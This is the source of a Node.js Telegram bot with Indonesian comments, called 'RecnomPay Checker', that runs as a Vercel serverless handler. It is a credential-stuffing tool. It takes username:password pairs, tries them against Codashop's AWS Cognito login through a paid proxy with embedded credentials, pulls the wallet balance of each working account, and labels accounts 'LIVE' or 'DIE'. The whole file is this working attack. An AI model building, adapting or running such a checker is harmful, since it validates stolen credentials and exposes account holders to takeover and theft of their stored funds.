const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Proxy dari file PHP kamu
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');

bot.start((ctx) => {
  ctx.reply('Halo! Selamat datang di RecnomPay Checker Bot.\n\nKetik perintah dengan format:\n/codashop username:password');
});

bot.command('codashop', async (ctx) => {
  // Mengambil teks setelah command /codashop
  const input = ctx.message.text.split(' ')[1];
  
  if (!input || !input.includes(':')) {
    return ctx.reply('❌ Format salah!\nGunakan format: /codashop username:password');
  }

  const [username, password] = input.split(':');
  const msgWait = await ctx.reply(`⏳ *RecnomPay System*\nSedang mengecek akun:\n\`${username}\`...`, { parse_mode: 'Markdown' });

  try {
    // 1. Hit API AWS Cognito (Initiate Auth)
    const authPayload = {
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    };

    const authRes = await axios.post('https://cognito-idp.ap-southeast-1.amazonaws.com/', authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1"
      },
      httpsAgent: proxyAgent,
      timeout: 20000 // Timeout 20 detik
    });

    if (authRes.data.AuthenticationResult) {
      const idToken = authRes.data.AuthenticationResult.IdToken;

      // 2. Hit API Wallet Codacash untuk cek Balance
      const walletRes = await axios.get('https://wallet-api.codacash.com/user/wallet', {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608"
        },
        httpsAgent: proxyAgent,
        timeout: 15000
      });

      const balance = walletRes.data.data ? walletRes.data.data.balanceAmount : 0;
      
      // Hapus pesan "sedang mengecek" dan kirim hasil LIVE
      await ctx.telegram.deleteMessage(ctx.chat.id, msgWait.message_id);
      return ctx.reply(`✅ *LIVE ACCOUNT*\n━━━━━━━━━━━━━━━━━━\nAcc: \`${username}:${password}\`\nBalance: ${balance}\n━━━━━━━━━━━━━━━━━━\n🤖 _RecnomPay Checker Selesai_`, { parse_mode: 'Markdown' });
    }

  } catch (error) {
    // Menangkap pesan DIE atau Error
    await ctx.telegram.deleteMessage(ctx.chat.id, msgWait.message_id);
    
    let errorMsg = 'Invalid Credentials / Timeout';
    if (error.response && error.response.data && error.response.data.__type) {
      errorMsg = error.response.data.__type.replace('Exception', '');
    }

    return ctx.reply(`❌ *DIE / ERROR*\n━━━━━━━━━━━━━━━━━━\nAcc: \`${username}:${password}\`\nMsg: ${errorMsg}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
  }
});

// Handler utama Vercel
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot Running!');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Error');
  }
};
